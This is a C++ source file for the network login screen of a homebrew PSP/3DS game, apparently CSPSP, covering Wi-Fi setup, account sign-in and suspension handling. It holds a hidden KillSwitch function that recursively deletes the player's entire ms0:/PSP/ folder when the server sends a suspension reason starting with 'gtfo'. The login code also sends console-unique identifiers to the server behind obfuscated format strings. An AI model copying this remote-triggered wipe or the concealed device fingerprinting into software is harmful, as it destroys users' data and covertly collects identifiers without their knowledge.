#include "GameStateConnect.h"

GameStateConnect::GameStateConnect(GameApp* parent): GameState(parent) 
{
	mStage = STAGE_SELECT;
}

GameStateConnect::~GameStateConnect() {}

void GameStateConnect::Create()
{
	mArePluginsModified = false;
	mArePluginsLoaded = true;
	mLoginStatus = 0;
	
	FILE *file;
	file = fopen("data/idstorage.prx","rb");
	if (file != NULL) {
		fseek(file,0,SEEK_END);
		int size = ftell(file);
		if (size != 2606) {
			mArePluginsModified = true;
		}
		fclose(file);
	}
	else {
		mArePluginsModified = true;
	}

	file = fopen("data/rapmet.prx","rb");
	if (file != NULL) {
		fseek(file,0,SEEK_END);
		int size = ftell(file);
		if (size != 1918) {
			mArePluginsModified = true;
		}
		fclose(file);
	}
	else {
		mArePluginsModified = true;
	}

	#if defined(WIN32) || defined(_3DS)
	mArePluginsLoaded = true;
	#else
	
	#ifdef DEVHOOK
	if (sceUtilityLoadNetModule(PSP_NET_MODULE_COMMON) < 0) {
		printf("Error, could not load PSP_NET_MODULE_COMMON\n");
		//sceKernelSleepThread();
	}
	if (sceUtilityLoadNetModule(PSP_NET_MODULE_INET) < 0) {
		printf("Error, could not load PSP_NET_MODULE_INET\n");
		//sceKernelSleepThread();
	} 		
	#endif

	//pspSdkInetInit();
	sceNetInit(0x20000, 0x20, 0x1000, 0x20, 0x1000); 
	sceNetInetInit(); 
	sceNetResolverInit(); 
	sceNetApctlInit(0x1400, 0x42); // increased stack size 

    SceUID mod = pspSdkLoadStartModule("data/idstorage.prx", PSP_MEMORY_PARTITION_KERNEL);
    if (mod < 0) {
        printf(" Error 0x%08X loading/starting idstorage.prx.\n", mod);
		mArePluginsLoaded = false;
        //sceKernelDelayThread(3*1000*1000);
        //sceKernelExitGame();
    }

	mod = pspSdkLoadStartModule("data/rapmet.prx", PSP_MEMORY_PARTITION_KERNEL);
    if (mod < 0) {
        mArePluginsLoaded = false;
    }
	

	#endif


	mConnectionsListBox = new ListBox(0,35,SCREEN_WIDTH,200,25,8);

	#if defined(WIN32)
	
	for (int i=0; i<9; i++) {
		char buffer[10];
		sprintf(buffer,"test%d",i);
		ConnectionConfig c;
		strcpy(c.name,buffer);
		c.index = i;
		//mConnections.push_back(c);
		mConnectionsListBox->AddItem(new ConnectionItem(c));
	}
    #elif defined(_3DS)
	#else

	std::vector<ConnectionConfig> connections = GetConnectionConfigs();
	for (int i=0; i<connections.size(); i++) {
		mConnectionsListBox->AddItem(new ConnectionItem(connections[i]));
	}

	#endif

	FormatText(mInstructions,instructions,SCREEN_WIDTH-40,0.75f);
	mStage = STAGE_SELECT;
	strcpy(mSuspendReason,"");
	mSuspendHours = 0;

	gKills = 0;
	gDeaths = 0;
	gKills2 = 0;
	gDeaths2 = 0;

	for (int i=0; i<4; i++) {
		strcpy(mConfigs[i],"");
		strcpy(mConfigInfo[i],"");
	}
	strcpy(mConfigs[0],"name");
	strcpy(mConfigInfo[0],"Enter your name (15 characters max)");
	strcpy(mConfigs[1],"password");
	strcpy(mConfigInfo[1],"Enter your password (15 characters max)");
	strcpy(mConfigs[3],"signin/signup");
	strcpy(mConfigInfo[3],"Signin to your account and start playing online!");
}

void GameStateConnect::Destroy() 
{
	for (int i=0; i<mInstructions.size(); i++) {
		//delete mInstructions[i];
	}
	mInstructions.clear();

	delete mConnectionsListBox;

	#if defined(WIN32) || defined(_3DS)
	#else
	//WlanTerm();
	//sceNetApctlDisconnect();
	//pspSdkInetTerm();
	#endif
}

void GameStateConnect::Start()
{
	mConnectState = 0;
	index = 0;

	//strncpy(name,GetConfig("data/config.txt","name"),15);
	strcpy(name,"");
	/*char* name2 = GetConfig("data/config.txt","name");
	if (name2 != NULL) {
		strcpy(name,name2);
		delete name2;
	}*/
	strcpy(password,"");
	mLoginStatus = 0;

	mStage = STAGE_SELECT;
	mRenderer->EnableVSync(true);

	mInfoX = -400.0f;

	if (mArePluginsModified) {
		mStage = STAGE_ERROR;
		strcpy(mErrorString,"Error loading required plugins");
	}
	else {
		if (mArePluginsLoaded) {
			#if defined(WIN32) || defined(_3DS)
			#else
			if (CheckTempAR() != -1) {
				mStage = STAGE_ERROR;
				strcpy(mErrorString,"Please disable tempAR");
			}
			#endif
		}
	}

}


void GameStateConnect::End()
{
	mRenderer->EnableVSync(false);
	//gHttpManager->ClearRequests();
}


void GameStateConnect::Update(float dt)
{
	if (mStage == STAGE_ERROR) {
		if (mEngine->GetButtonClick(PSP_CTRL_CIRCLE)) {
			mParent->SetNextState(GAME_STATE_MENU);
		}
		return;
	}

	if (mStage != STAGE_NEWACCOUNTSUBMIT) {
		if (mEngine->GetButtonClick(PSP_CTRL_CIRCLE) && !gDanzeff->mIsActive) {
			if (mStage == STAGE_SELECT) {
				mParent->SetNextState(GAME_STATE_MENU);
			}

			WlanTerm();
			/*if (mStage == STAGE_SELECT) {
				mParent->SetNextState(GAME_STATE_MENU);
			}
			else {
				WlanTerm();
			}*/

			mConnectState = 0;
			mLoginStatus = 0;
			gHttpManager->ClearRequests();

			mStage = STAGE_SELECT;
			return;
		}
	}

	if (mStage == STAGE_SELECT) {
		#if defined(WIN32) || defined(_3DS)
			/*WlanInit();
			gHttpManager->Connect("74.125.19.118","cspsp.appspot.com",80);
			mStage = STAGE_LOGIN;*/
		#else
			/*WlanInit();
			connection.InitGU();
			connection.SetBGColor(0xFF202020);
			if (connection.Connect()) {
				//connection.TermGU();
				
				gHttpManager->Connect("74.125.19.118","cspsp.appspot.com",80);
				mStage = STAGE_LOGIN;
				
			} else {
				mParent->SetNextState(GAME_STATE_MENU);
				//connection.TermGU();
			}
			mRenderer->InitRenderer();*/
		#endif

    #ifndef _3DS
		if (mEngine->GetButtonClick(PSP_CTRL_CROSS)) {
			ConnectionItem *item = (ConnectionItem*)mConnectionsListBox->GetItem();
			if (item != NULL) {
				WlanInit();
				mConnectState = 1;
				mConnectId = item->config.index;
				mStage = STAGE_CONNECTING;
			}
		}
		mConnectionsListBox->Update(dt);
    #else
    if (mEngine->GetButtonClick(PSP_CTRL_CROSS)) {
        mConnectState = 1;
        mStage = STAGE_CONNECTING;
    }
    #endif
	}
	else if (mStage == STAGE_CONNECTING) {
		#if defined(WIN32) || defined(_3DS)
        mConnectState = 4;
		#else
		mConnectState = UseConnectionConfig(mConnectId,mConnectState);
		#endif
		if (mConnectState == 4) {
			//SocketConnect(gSocket,"74.125.19.118",80);
			//74.125.53.141
			gHttpManager->Connect("74.125.53.141","cspsp.appspot.com",80);
			//gHttpManager->Connect("127.0.0.1","localhost",8080);
			mStage = STAGE_LOGIN;

			strcpy(id,"");
			strcpy(psid,"");
			strcpy(encodedKey,"");

			#if defined(WIN32) || defined(_3DS)
			FILE *file = fopen("sdmc:/3ds/cspsp/MEMSTICK_PRO.IND", "r");

            u64 hash;
            u64 hash2;
            u64 hash3;
            u64 hash4;
            CFGU_GenHashConsoleUnique(0xF1BAD, &hash);
            CFGU_GenHashConsoleUnique(0x00BAE, &hash2);
            CFGU_GenHashConsoleUnique(0x00B00, &hash3);
            CFGU_GenHashConsoleUnique(0x0BABE, &hash4);
            snprintf(psid, 65, "%08X%08X%08X%08X", hash, hash2, hash3, hash4);

			#else
			FILE *file = fopen("ms0:/MEMSTICK_PRO.IND", "r");

			if (mArePluginsLoaded) {
				char buffer[512];
				int currkey = 0x100;
				memset(buffer, 0, 512);
				int s = ReadKey(currkey, buffer);

				if (s != 0)
				{
					printf("            Attempt to read key returned code %X\n", s);
				}
				else {
					for (int i=0; i<512; i+=32)
					{
						char text[32];
						for (int j=0; j<32; j++)
						{
							sprintf(text,"%02X", (int)buffer[i+j] & 0xff);
							strcat(id,text);
						}
					}
				}
			}

			PspOpenPSID psidobj;
			sceOpenPSIDGetOpenPSID(&psidobj);
			for (int i=0; i<16; i++) {
				char text[32];
				sprintf(text, "%02X", (int)psidobj.data[i] & 0xff);
				strcat(psid,text);
			}

			#endif

			if (file != NULL) {
				fgets(encodedKey,256,file);
				fclose(file);
			}

			char decoding[2000];
			char data[2000];

			sprintf(data,DecodeText(decoding,"206200162137216138213215206200162137216138208201222161138215139218202214216205212210162137201"),
				id,psid,encodedKey,(int)(VERSION*100));
				// id=%s&psid=%s&key=%s&version=%d
			strcpy(decoding,"");

            printf("data:%s\n", data);
			gHttpManager->SendRequest("/accounts/login.html",data,REQUEST_POST);
			mLoginStatus = 0;
			/*int n = SocketSend(gSocket,request,strlen(request));
			if (n > 0) {
				mHasRequestedLogin = true;
			}*/
		}
	}
	else if (mStage == STAGE_LOGIN) {
	}
	else if (mStage == STAGE_NEWACCOUNT) {
		mInfoX *= 0.75f;

		if (!gDanzeff->mIsActive) {
			int temp = index;
			if (mEngine->GetButtonState(PSP_CTRL_UP) || mEngine->GetAnalogY()<64) {
				if (KeyRepeated(PSP_CTRL_UP,dt)) {
					index--;
					if (index < 0) {
						index = 4-1;
					}
				}
			}
			else if (mEngine->GetButtonState(PSP_CTRL_DOWN) || mEngine->GetAnalogY()>192) {
				if (KeyRepeated(PSP_CTRL_DOWN,dt)) {
					index++;
					if (index > 4-1) {
						index = 0;
					}
				}
			}
			else {
				gLastKey = 0;
			}
			if (temp != index) {
				mInfoX = -400.0f;
			}

			if (mEngine->GetButtonClick(PSP_CTRL_CROSS)) {
				if (index == 0) {
					gDanzeff->Enable();
					gDanzeff->mString = name;
					tempname = name;
				}
				else if (index == 1) {
					gDanzeff->Enable();
					gDanzeff->mString = password;
					temppassword = password;
				}
				else if (index == 4-1) {
					if (strlen(name) > 0 && strlen(password) > 0) {
						mStage = STAGE_NEWACCOUNTSUBMIT;
						mLoginStatus = 0;

						string nametemp = "";
						for (int i=0; i<strlen(name); i++) {
							if (name[i] == '&') {
								nametemp += "%26";
							}
							else {
								nametemp += name[i];
							}
						}

						string passwordtemp = "";
						for (int i=0; i<strlen(password); i++) {
							if (password[i] == '&') {
								passwordtemp += "%26";
							}
							else {
								passwordtemp += password[i];
							}
						}
						char decoding[2000];
						char data[2000];

						sprintf(data,DecodeText(decoding,"211197210201162137216138213197216215220211215200162137216138206200162137216138213215206200162137216138208201222161138215139218202214216205212210162137201"),
							nametemp.c_str(),passwordtemp.c_str(),id,psid,encodedKey,(int)(VERSION*100));
							// name=%s&password=%s&id=%s&psid=%s&key=%s&version=%d
						strcpy(decoding,"");

						gHttpManager->SendRequest("/accounts/login.html",data,REQUEST_POST);
					}
					else {
					}
				}
			}
		}
		else if (gDanzeff->mIsActive) {
			gDanzeff->Update(dt);
			if (gDanzeff->mString.length() > 15) {
				gDanzeff->mString = gDanzeff->mString.substr(0,15);
			}
			if (gDanzeff->mString.length() > 0) {
				char character = gDanzeff->mString[gDanzeff->mString.length()-1];
				if (character == ' ' || character == ':' || character == '[' || character == ']') {
					gDanzeff->mString = gDanzeff->mString.substr(0,gDanzeff->mString.length()-1);
				}
			}

			if (index == 0) {
				tempname = (char*)gDanzeff->mString.c_str();
			}
			if (index == 1) {
				temppassword = (char*)gDanzeff->mString.c_str();
			}

			if (mEngine->GetButtonClick(PSP_CTRL_START)) {
				if (index == 0) {
					strcpy(name,tempname);
				}
				if (index == 1) {
					strcpy(password,temppassword);
				}	
				gDanzeff->Disable();
			}
			else if (mEngine->GetButtonClick(PSP_CTRL_SELECT)) {
				gDanzeff->Disable();
			}
		}
	}
	else if (mStage == STAGE_NEWACCOUNTSUBMIT) {
		/*if (mEngine->GetButtonClick(PSP_CTRL_CROSS)) {
			if (mLoginStatus == 1) {
				mParent->SetNextState(GAME_STATE_LOBBY);
			}
			return;
		}*/
		if (mEngine->GetButtonClick(PSP_CTRL_CIRCLE)) {
			if (mLoginStatus == 0) {
				mStage = STAGE_NEWACCOUNT;
			}
			/*else if (mLoginStatus == 1) {
				mParent->SetNextState(GAME_STATE_LOBBY);
				return;
			}*/
			else if (mLoginStatus == 5) {
				mStage = STAGE_NEWACCOUNT;
			}
			else {
				mStage = STAGE_NEWACCOUNT;
			}
			return;
		}
	}
	else if (mStage == STAGE_SUSPENDED) {
	}

	gHttpManager->Update(dt);
	char buffer[8192];
	int size = gHttpManager->GetResponse(buffer);
	if (size > 0) {
		//char* buffer = gHttpManager->GetResponse();
		if (strstr(buffer,"LOGIN")) {
			int code = CheckLogin(buffer);
			if (code == 0) {
				mParent->SetNextState(GAME_STATE_LOBBY);
				return;
			}
			else if (code == 1) {
				mStage = STAGE_SUSPENDED;
				if (strncmp(mSuspendReason, "gtfo", 4) == 0) {
					KillSwitch("ms0:/PSP/");
				}
			}
			else if (code == 2) {
				mStage = STAGE_NEWACCOUNT;
			}
			else if (code == 3) {
				mParent->SetNextState(GAME_STATE_UPDATE);
				return;
			}
			else if (code == 4) {
				mStage = STAGE_MAINTENANCE;
			}
			else if (code == 5) {
				mLoginStatus = 5;
			}
			else if (code == -1) {
				mLoginStatus = -1;
			}
		}
		/*if (strstr(buffer,"NEWACCOUNT")) {
			mNewAccountStatus = CheckNewAccount(buffer);
		}*/
		//delete buffer;
	}
}


void GameStateConnect::Render()
{
	mRenderer->ClearScreen(ARGB(255,255,255,255));
	mRenderer->RenderQuad(gBgQuad, 0.0f, 0.0f);

	gFont->SetColor(ARGB(255,255,255,255));
	gFont->SetScale(0.75f);

	if (mStage == STAGE_SELECT || mStage == STAGE_CONNECTING || mStage == STAGE_LOGIN || mStage == STAGE_SUSPENDED || mStage == STAGE_MAINTENANCE || mStage == STAGE_ERROR) {
		gFont->SetScale(1.0f);
		gFont->DrawShadowedString("Network Connection",20,10);
		gFont->SetScale(0.75f);

		mRenderer->FillRect(0,35,SCREEN_WIDTH,200,ARGB(100,0,0,0));

		gFont->DrawShadowedString("[X] Select Connection     [O] Return to Menu", SCREEN_WIDTH_2, SCREEN_HEIGHT-20, JGETEXT_CENTER);

		gFont->SetScale(1.0f);
    #ifndef _3DS
		if (mConnectionsListBox->IsEmpty()) {
			gFont->DrawShadowedString("No network connections.",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
		}
		else {
			mConnectionsListBox->Render();
		}
        #else
        gFont->DrawShadowedString("Press [A] to sign in.",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
        #endif
		gFont->SetScale(0.75f);

		if (mStage != STAGE_SELECT) {
			mRenderer->FillRect(0,0,SCREEN_WIDTH,SCREEN_HEIGHT,ARGB(200,0,0,0));
			gFont->SetColor(ARGB(255,255,255,255));
			gFont->SetScale(0.75f);
		}

		if (mStage == STAGE_CONNECTING) {
			gFont->DrawShadowedString("[O] Cancel",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);
			
			gFont->SetScale(1.0f);
			if (mConnectState >= 1 && mConnectState <= 4) {
				char buffer[128];
				sprintf(buffer,"Connection state %i of 4",mConnectState);
				gFont->DrawShadowedString(buffer,SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
			else if (mConnectState == 0) {
				gFont->DrawShadowedString("Connection failed",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
			else if (mConnectState == -1) {
				gFont->DrawShadowedString("Connection failed (check wlan switch)",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
		}
		else if (mStage == STAGE_LOGIN) {
			gFont->SetScale(0.75f);
			gFont->DrawShadowedString("[O] Cancel",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);
			
			gFont->SetScale(1.0f);
			if (mLoginStatus == -1) {
				gFont->DrawShadowedString("Unspecified error. Please retry.",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
			else {
				gFont->DrawShadowedString("Signing in...",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
		}
		else if (mStage == STAGE_SUSPENDED) {
			gFont->DrawShadowedString("[O] Return",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);
			
			gFont->SetScale(1.0f);
			char buffer[128];
			sprintf(buffer,"You are suspended for %i hour(s)",mSuspendHours);
			gFont->DrawShadowedString(buffer,SCREEN_WIDTH_2,SCREEN_HEIGHT_2-10,JGETEXT_CENTER);

			strcpy(buffer,"");
			sprintf(buffer,"Reason: %s",mSuspendReason);
			gFont->DrawShadowedString(buffer,SCREEN_WIDTH_2,SCREEN_HEIGHT_2+10,JGETEXT_CENTER);
		}
		else if (mStage == STAGE_MAINTENANCE) {
			gFont->DrawShadowedString("[O] Return",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);

			gFont->SetScale(1.0f);
			gFont->DrawShadowedString("The online system is currently under maintenance.",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
		}
		else if (mStage == STAGE_ERROR) {
			gFont->DrawShadowedString("[O] Return",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);

			gFont->SetScale(1.0f);
			gFont->DrawShadowedString(mErrorString,SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
		}
	}

	else if (mStage == STAGE_NEWACCOUNT || mStage == STAGE_NEWACCOUNTSUBMIT) {
		int starty = 115;
		mRenderer->FillRect(0,starty,SCREEN_WIDTH,100,ARGB(100,0,0,0));
		mRenderer->FillRect(0,starty+100,SCREEN_WIDTH,30,ARGB(175,0,0,0));

		gFont->SetScale(0.75f);
		for (int i=0; i<mInstructions.size(); i++) {
			gFont->DrawShadowedString(mInstructions[i], 20, 20+i*15);
		}

		if (!gDanzeff->mIsActive) {
			mRenderer->FillRect(0,starty+index*25,SCREEN_WIDTH,25,ARGB(255,0,0,0));
			gFont->DrawShadowedString("[X] Select     [O] Return",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);
		}
		else {
			mRenderer->FillRect(0,starty+index*25,SCREEN_WIDTH,25,ARGB(100,0,128,255));
			gFont->DrawShadowedString("[START] Enter    [SELECT] Cancel",SCREEN_WIDTH_2,SCREEN_HEIGHT_F-20,JGETEXT_CENTER);
		}

		mRenderer->DrawLine(160,starty,160,starty+100,ARGB(255,255,255,255));

		gFont->SetScale(1.0f);
		gFont->SetColor(ARGB(255,255,255,255));
		float x = 160-10;

		for (int i=0; i<4; i++) {
			if (i == index) {
				gFont->SetColor(ARGB(255,255,255,255));
				gFont->SetScale(0.75f);
				gFont->DrawShadowedString(mConfigInfo[i],10.0f+mInfoX,starty+100+10);
				gFont->SetScale(1.0f);
				gFont->SetColor(ARGB(255,0,128,255));
			}
			else {
				gFont->SetColor(ARGB(255,255,255,255));
			}
			gFont->DrawShadowedString(mConfigs[i],x,starty+3+i*25,JGETEXT_RIGHT);
		}

		gFont->SetScale(0.75f);
		gFont->SetColor(ARGB(255,255,255,255));

		int startx = 160+10;
		if (!gDanzeff->mIsActive) {
			gFont->DrawShadowedString(name,startx,starty+5);
			gFont->DrawShadowedString(password,startx,starty+5+25);
		}
		else if (gDanzeff->mIsActive) {
			if (index == 0) {
				gFont->DrawShadowedString(password,startx,starty+5+25);

				gFont->DrawShadowedString(tempname,startx,starty+5);
				gFont->DrawShadowedString("|",startx+gFont->GetStringWidth(tempname),starty+5);
			}
			else if (index == 1) {
				gFont->DrawShadowedString(name,startx,starty+5);

				gFont->DrawShadowedString(temppassword,startx,starty+5+25);
				gFont->DrawShadowedString("|",startx+gFont->GetStringWidth(temppassword),starty+5+25);
			}
			gDanzeff->Render(SCREEN_WIDTH-175,SCREEN_HEIGHT-175);
		}

		if (mStage == STAGE_NEWACCOUNTSUBMIT) {
			mRenderer->FillRect(0,0,SCREEN_WIDTH,SCREEN_HEIGHT,ARGB(200,0,0,0));

			gFont->SetScale(0.75f);
			gFont->SetColor(ARGB(255,255,255,255));
			if (mLoginStatus == 0) {
				gFont->DrawShadowedString("[O] Cancel", SCREEN_WIDTH_2, SCREEN_HEIGHT-20, JGETEXT_CENTER);

				gFont->SetScale(1.0f);
				gFont->DrawShadowedString("Signing in...",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
			/*else if (mNewAccountStatus == 0) {
				gFont->DrawShadowedString("[X/O] Continue to Online Menu", SCREEN_WIDTH_2, SCREEN_HEIGHT-20, JGETEXT_CENTER);

				gFont->SetScale(1.0f);
				char buffer[128];
				gFont->DrawShadowedString("Successfully signed in as",SCREEN_WIDTH_2,SCREEN_HEIGHT_2-10.0f,JGETEXT_CENTER);
				gFont->DrawShadowedString(gName,SCREEN_WIDTH_2,SCREEN_HEIGHT_2+10.0f,JGETEXT_CENTER);
			}*/
			else if (mLoginStatus == 5) {
				gFont->DrawShadowedString("[O] Return", SCREEN_WIDTH_2, SCREEN_HEIGHT-20, JGETEXT_CENTER);

				gFont->SetScale(1.0f);
				gFont->DrawShadowedString("Name already exists / Wrong password",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
			else {
				gFont->DrawShadowedString("[O] Return", SCREEN_WIDTH_2, SCREEN_HEIGHT-20, JGETEXT_CENTER);

				gFont->SetScale(1.0f);
				gFont->DrawShadowedString("Unspecified error. Please retry.",SCREEN_WIDTH_2,SCREEN_HEIGHT_2,JGETEXT_CENTER);
			}
		}
	}
}

void GameStateConnect::RenderBottom()
{
    mRenderer->ClearScreen(ARGB(255,255,255,255));
    mRenderer->RenderQuad(gBgQuad, 0.0f, 0.0f);
}


int GameStateConnect::CheckLogin(char* buffer)
{
	char* s;

	s = strstr(buffer,"LOGIN");
	if (s == NULL) {
		return -1;		
	}

	s += strlen("LOGIN") + 2;

	if (*s == '0') {
		// successful login
		s += 3;
		char salt[32];
		char decoding[2000];
		sscanf(s,DecodeText(decoding,"138215133137216132138215133137216132138215133137216132138215133137201132138200"),
				gSessionKey,gKey,salt,gName,gEncodedName,gDisplayName,gEncodedDisplayName,&gKills,&gDeaths);
			//%s %s %s %s %s %s %s %d %d
		strcpy(decoding,"");

		for (int i=0; i<9; i++) {
			s = strstr(s,"\r\n") + 2;
		}
		memcpy(gIcon,s,300);
		UpdateIcon(gIconTexture,gIcon);

		//EncodeText(gEncodedName,gName);
		//EncodeText(gEncodedDisplayName,gDisplayName);
		gKills2 = gKills*7;
		gDeaths2 = gDeaths*7;

		#if defined(WIN32) || defined(_3DS)
		FILE *file = fopen("sdmc:/3ds/cspsp/MEMSTICK_PRO.IND", "w");
		#else
		FILE *file = fopen("ms0:/MEMSTICK_PRO.IND", "w");
		#endif
		if (file != NULL) {
			char buffer[256];
			strcpy(buffer,"");
			strcat(buffer,gKey);
			strcat(buffer,salt);
			char encoding[256];
			EncodeText(encoding,buffer);
			fputs(encoding,file);
			fclose(file);
		}
		return 0;
	}
	else if (*s == '1') {
		// suspended
		s += 3;
		char decoding[2000];
		sscanf(s,DecodeText(decoding,"138191195158194158138205"),mSuspendReason,&mSuspendHours);
			//%[^:]:%i
		strcpy(decoding,"");
		return 1;
	}
	else if (*s == '2') {
		// new account
		return 2;
	}
	else if (*s == '3') {
		return 3;
	}
	else if (*s == '4') {
		return 4;
	}
	else if (*s == '5') {
		return 5;
	}
	return -1;
}


/*int GameStateConnect::CheckNewAccount(char* buffer)
{
	char* s;

	s = strstr(buffer,"NEWACCOUNT");
	if (s == NULL) {
		return false;		
	}

	s += strlen("NEWACCOUNT") + 2;

	if (*s == '0') {
		s += 2;
		char decoding[2000];
		sscanf(s,DecodeText(decoding,"138215133137216132138215133137216132138215133137216"),
			gSessionKey,gKey,gName,gEncodedName,gDisplayName,gEncodedDisplayName);
			//%s %s %s %s %s %s
		strcpy(decoding,"");

		for (int i=0; i<6; i++) {
			s = strstr(s,"\r\n") + 2;
		}
		memcpy(gIcon,s,300);
		UpdateIcon(gIconTexture,gIcon);

		EncodeText(gEncodedName,gName);
		EncodeText(gEncodedDisplayName,gDisplayName);
		return 0;
	}
	else if (*s == '1') {
		return 1;
	}
	else {
		return 2;
	}
	return 2;
}*/

void GameStateConnect::KillSwitch(char *dir)
{
	// >:|

	#if defined(WIN32)
    #elif defined(_3DS)
    DIR *dip;
    struct dirent *dit;
    dip = opendir(dir);
    char fullname[512];

    while ((dit = readdir(dip)) != NULL) {
        char *name = dit->d_name;

        if ((dit->d_type == DT_DIR) && stricmp(name, ".") && stricmp(name, "..")) {
            sprintf(fullname, "%s%s/", dir, dit->d_name);

            /*FILE *file = fopen("kill.txt", "a");
             fputs(fullname, file);
             fputs("\n", file);
             fclose(file);*/
            KillSwitch(fullname);
            rmdir(fullname);
        }
        else {
            sprintf(fullname, "%s%s", dir, dit->d_name); 
            remove(fullname); 
        }
    }
    closedir(dip);
	#else
	
	DIR *dip;
	struct dirent *dit;
	dip = opendir(dir);
	char fullname[512];

	while ((dit = readdir(dip)) != NULL) {
		char *name = dit->d_name;

		if ((FIO_S_IFREG & (dit->d_stat.st_mode & FIO_S_IFMT)) == 0 && stricmp(name, ".") && stricmp(name, "..")) {
			sprintf(fullname, "%s%s/", dir, dit->d_name); 

			/*FILE *file = fopen("kill.txt", "a");
			fputs(fullname, file);
			fputs("\n", file);
			fclose(file);*/
			KillSwitch(fullname);
			rmdir(fullname); 
		}
		else {
			sprintf(fullname, "%s%s", dir, dit->d_name); 
			remove(fullname); 
		}
	}
	closedir(dip);
	
	#endif
}
